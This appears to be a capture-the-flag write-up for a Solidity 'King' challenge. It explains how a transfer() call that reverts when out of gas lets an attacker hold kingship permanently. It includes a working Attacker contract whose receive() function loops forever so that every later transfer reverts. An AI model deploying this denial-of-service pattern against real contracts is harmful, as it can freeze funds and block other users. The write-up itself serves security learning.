## Goal

Stop another account (EOA or contract) of reclaiming kingship

## Exploit

In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.

If we take a look at the contract, we can notice that the vulnerable part of the code is located in the following code:

```
payable(king).transfer(msg.value);
```

When someone tries to renounce kingship, the ether send in the transaction is sent to the current king.

The issue is in the transfer function, it reverts if the transaction conducts more than 2300 gas, so what we can do is, we can become king, and when someone tries to become new king, when the ether will be send to our Attacker contract, we can cause the transaction to revert.

To exploit the contract we need to:

1. create Attacker contract, and send the address of the King contract in the constructor.
2. in the constructor we send a transaction to King contract with some value in order for the Attacker contract to become King
3. implement receive() function to run in infinite loop, this will cause failure of the transaction because of too much gas

## Attacker contract code

```
contract Attacker {
  uint256 private count;

  constructor(address king) payable {
    (bool sent, ) = king.call{value: msg.value}("");
    require(sent, "Failed to send Ether");
  }

  receive() external payable {
    while (true) {
      count++;
    }
  }
}
```
